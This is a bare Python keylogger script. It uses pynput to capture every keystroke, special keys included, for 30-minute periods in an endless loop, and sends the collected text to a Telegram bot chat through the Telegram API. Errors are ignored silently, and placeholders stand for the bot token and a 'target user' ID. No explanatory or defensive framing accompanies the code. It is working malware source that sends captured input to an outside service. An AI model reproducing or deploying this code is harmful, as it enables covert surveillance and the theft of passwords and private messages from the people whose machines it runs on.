import time as t
from pynput import keyboard as k
import requests

# Telegram Bot Configuration
BOT_API_TOKEN = "YOUR_BOT_API_TOKEN"  # Replace with your bot's API token
USER_ID = "USER_ID"  # Replace with the target user's Telegram ID

# Keystroke storage
keystrokes = []

# Function to send a message via Telegram
def send_telegram_message(body):
    try:
        url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/sendMessage"
        payload = {
            "chat_id": USER_ID,
            "text": body
        }
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Message sent successfully.")
        else:
            print("Failed to send message.")
    except Exception as e:
        print(f"Error: {e}")

# Key press event handler
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystrokes.append(key.char)  # Store printable characters
        else:
            keystrokes.append(f"**{str(key).replace('Key.', '')}**")  # Store special keys in bold
    except:
        pass  # Ignore errors silently

# Main loop
while True:
    keystrokes.clear()  # Clear previous logs

    # Set up keyboard listener
    with k.Listener(on_press=on_press) as listener:
        t.sleep(1800)  # Capture keystrokes for 30 minutes

    # Convert keystrokes list to string
    log_data = ''.join(keystrokes)

    # Send message with keystroke logs via Telegram
    send_telegram_message(log_data)
